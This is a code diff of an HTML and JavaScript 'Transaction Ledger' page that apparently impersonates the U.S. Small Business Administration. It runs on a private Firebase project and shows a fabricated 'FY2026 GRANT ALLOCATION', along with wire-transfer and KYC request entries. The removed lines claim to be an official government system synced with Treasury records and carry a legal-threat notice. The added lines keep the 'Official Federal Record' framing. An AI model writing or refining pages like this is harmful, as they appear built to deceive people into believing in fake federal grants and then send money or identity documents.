@@ -3,69 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBA Portal | Transaction Ledger</title>
+    <title>SBA | Transactions</title>
     <style>
-        :root { --sba-blue: #00274c; --sba-accent: #0071bc; --sba-red: #ba0c2f; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
-        
-        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
-        .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
-        
-        .container { max-width: 500px; margin: 0 auto; padding: 15px; }
-        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-top: 4px solid var(--sba-accent); min-height: 200px; }
-
-        .t-row { display: flex; justify-content: space-between; padding: 18px 0; border-bottom: 1px solid #f1f5f9; align-items: center; }
-        .t-row:last-child { border-bottom: none; }
-        .t-info { display: flex; flex-direction: column; gap: 4px; }
-        .t-name { font-weight: 700; font-size: 11px; color: var(--sba-blue); text-transform: uppercase; letter-spacing: 0.5px; }
-        .t-date { font-size: 10px; color: #94a3b8; font-family: 'Courier New', monospace; font-weight: bold; }
-        .t-amt { font-weight: 800; text-align: right; font-size: 14px; }
-        
-        .plus { color: #10b981; }
-        .minus { color: #ef4444; }
-        
-        .status-badge { font-size: 9px; padding: 3px 10px; border-radius: 4px; font-weight: 900; text-transform: uppercase; margin-top: 5px; display: inline-block; }
-        .bg-pending { background: #fff7ed; color: #9a3412; border: 1px solid #ffedd5; }
-        .bg-success { background: #ecfdf5; color: #065f46; border: 1px solid #d1fae5; }
-        .bg-denied { background: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; }
-        .empty-state { text-align: center; padding: 40px 20px; color: #64748b; font-size: 12px; font-style: italic; }
+        body { background: #f1f5f9; font-family: sans-serif; margin: 0; padding: 15px; }
+        .card { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-top: 4px solid #0071bc; }
+        .t-row { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #f1f5f9; align-items: center; }
+        .t-name { font-weight: bold; font-size: 13px; color: #00274c; display: block; text-transform: uppercase; }
+        .t-date { font-size: 11px; color: #94a3b8; font-family: monospace; }
+        .t-amt { font-weight: 800; text-align: right; }
+        .plus { color: #10b981; } .minus { color: #ef4444; }
+        .badge { font-size: 9px; padding: 3px 6px; border-radius: 4px; font-weight: bold; text-transform: uppercase; display: inline-block; margin-top: 4px; }
+        .SUCCESSFUL { background: #dcfce7; color: #166534; }
+        .PENDING { background: #fef3c7; color: #92400e; }
+        .REJECTED { background: #fee2e2; color: #991b1b; }
     </style>
 </head>
 <body>
-
-    <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;" alt="US Flag">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE PORTAL
+    <div style="margin-bottom:20px;">
+        <h2 style="color:#00274c; margin:0;">Transaction Ledger</h2>
+        <p style="font-size:11px; color:#64748b;">Official Federal Record History</p>
     </div>
 
-    <div class="nav-header">
-        <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight:900;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:6px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">BACK</button>
-    </div>
-
-    <div class="container">
-        <div style="margin-bottom: 20px;">
-            <h2 style="color: var(--sba-blue); font-size: 20px; margin: 0;">Transaction Ledger</h2>
-            <p style="font-size: 11px; color: #64748b; margin-top: 4px;">Synchronized with Treasury Federal Records.</p>
-        </div>
-
-        <div class="card" id="transactionList">
-            <div class="empty-state">Establishing secure handshake with federal servers...</div>
-        </div>
-
-        <div style="background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; border-radius: 8px; margin-top: 20px;">
-            <p style="font-size: 10px; color: #92400e; margin: 0; line-height: 1.5;">
-                <b>AUDIT NOTICE:</b> All entries above are subject to Title 18, Section 1001 of the U.S. Code. Any unauthorized modification of this ledger is a federal offense punishable by law.
-            </p>
-        </div>
-    </div>
+    <div class="card" id="list">Synchronizing with secure servers...</div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, collection, query, where, onSnapshot, doc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCq8CgTyNbKVbUm_GItIC7FAvTuNrNspxI",
             authDomain: "sba-portal-2026-f1253.firebaseapp.com",
@@ -81,89 +46,44 @@
 
         onAuthStateChanged(auth, (user) => {
             if (!user) { window.location.href = 'index.html'; return; }
+            
+            const container = document.getElementById('list');
 
-            const list = document.getElementById('transactionList');
+            // 1. Get User Data for the Pinned Grant Allocation
+            onSnapshot(doc(db, "users", user.uid), (uSnap) => {
+                const u = uSnap.data();
+                const bal = parseFloat(u.balance || 0).toLocaleString();
 
-            // 1. Listen to the User Document for Balance & ID
-            onSnapshot(doc(db, "users", user.uid), (userSnap) => {
-                if (!userSnap.exists()) return;
-                const userData = userSnap.data();
-                
-                let rawBal = userData.balance || 0;
-                if(typeof rawBal === 'string') rawBal = rawBal.replace(/[$,]/g, '');
-                const formattedBal = parseFloat(rawBal).toLocaleString('en-US', {minimumFractionDigits: 2});
-
-                // 2. Listen to Requests History (Wire Transfers, KYC, etc.)
-                const q = query(
-                    collection(db, "requests"), 
-                    where("userId", "==", user.uid),
-                    orderBy("timestamp", "desc")
-                );
-                
-                onSnapshot(q, (snapshot) => {
-                    list.innerHTML = ""; 
-
-                    // PINNED HEADER: The Initial Grant Allocation
-                    list.innerHTML += `
+                // 2. Get All Requests
+                const q = query(collection(db, "requests"), where("userId", "==", user.uid));
+                onSnapshot(q, (snap) => {
+                    let html = `
                         <div class="t-row">
-                            <div class="t-info">
-                                <span class="t-name">FY2026 GRANT ALLOCATION</span>
-                                <span class="t-date">REF: FED-${user.uid.substring(0,8).toUpperCase()}</span>
-                            </div>
-                            <div class="t-amt">
-                                <span class="plus">+$${formattedBal}</span><br>
-                                <span class="status-badge bg-success">ALLOCATED</span>
-                            </div>
-                        </div>
-                    `;
+                            <div><span class="t-name">FY2026 GRANT ALLOCATION</span><span class="t-date">REF-ID: ${user.uid.slice(0,8)}</span></div>
+                            <div class="t-amt"><span class="plus">+$${bal}</span><br><span class="badge SUCCESSFUL">ALLOCATED</span></div>
+                        </div>`;
 
-                    // If no other transactions exist
-                    if (snapshot.empty) {
-                        // Allocation is already showing, no need for empty state unless balance is 0
-                        if(parseFloat(rawBal) === 0) list.innerHTML = `<div class="empty-state">No federal records found.</div>`;
-                    } else {
-                        snapshot.forEach((doc) => {
-                            const t = doc.data();
-                            const status = (t.status || 'PENDING').toUpperCase();
+                    if (!snap.empty) {
+                        // Sort by date in JavaScript (Zero index footprint)
+                        const docs = snap.docs.sort((a, b) => (b.data().timestamp?.seconds || 0) - (a.data().timestamp?.seconds || 0));
+                        
+                        docs.forEach(d => {
+                            const t = d.data();
+                            const isOut = t.type?.includes("WIRE") || t.type?.includes("TRANSFER");
+                            const status = t.status || "PENDING";
+                            const date = t.timestamp ? t.timestamp.toDate().toLocaleDateString() : "PROCESSING";
                             
-                            // Visual Badge Handling
-                            let badgeClass = "bg-pending";
-                            if (["SUCCESSFUL", "APPROVED", "COMPLETED"].includes(status)) badgeClass = "bg-success";
-                            if (["DENIED", "FAILED", "REJECTED", "DECLINED"].includes(status)) badgeClass = "bg-denied";
-
-                            const type = (t.type || "REQUEST").toUpperCase();
-                            
-                            // Determine if money is going out (Minus)
-                            const isNeg = type.includes("TRANSFER") || type.includes("WIRE") || type.includes("WITHDRAWAL");
-                            
-                            let amtRaw = t.amount || 0;
-                            if(typeof amtRaw === 'string') amtRaw = amtRaw.replace(/[$,]/g, '');
-                            const formattedAmt = parseFloat(amtRaw).toLocaleString('en-US', {minimumFractionDigits: 2});
-                            
-                            // Human-readable date
-                            let dateStr = "SYNCING...";
-                            if(t.timestamp) {
-                                const d = t.timestamp.toDate();
-                                dateStr = d.toLocaleDateString('en-US', {month:'short', day:'numeric', year:'numeric'});
-                            }
-
-                            list.innerHTML += `
+                            html += `
                                 <div class="t-row">
-                                    <div class="t-info">
-                                        <span class="t-name">${type.replace(/_/g, ' ')}</span>
-                                        <span class="t-date">${dateStr}</span>
-                                    </div>
+                                    <div><span class="t-name">${t.type?.replace(/_/g, ' ')}</span><span class="t-date">${date}</span></div>
                                     <div class="t-amt">
-                                        <span class="${isNeg ? 'minus' : 'plus'}">${isNeg ? '-' : '+'}$${formattedAmt}</span><br>
-                                        <span class="status-badge ${badgeClass}">${status}</span>
+                                        <span class="${isOut ? 'minus' : 'plus'}">${isOut ? '-' : '+'}$${parseFloat(t.amount || 0).toLocaleString()}</span><br>
+                                        <span class="badge ${status}">${status}</span>
                                     </div>
-                                </div>
-                            `;
+                                </div>`;
                         });
                     }
-                }, (err) => {
-                    console.error("Index Required Error:", err);
-                    list.innerHTML = `<div class="empty-state">Records temporarily unavailable. Syncing database...</div>`;
+                    container.innerHTML = html;
                 });
             });
         });
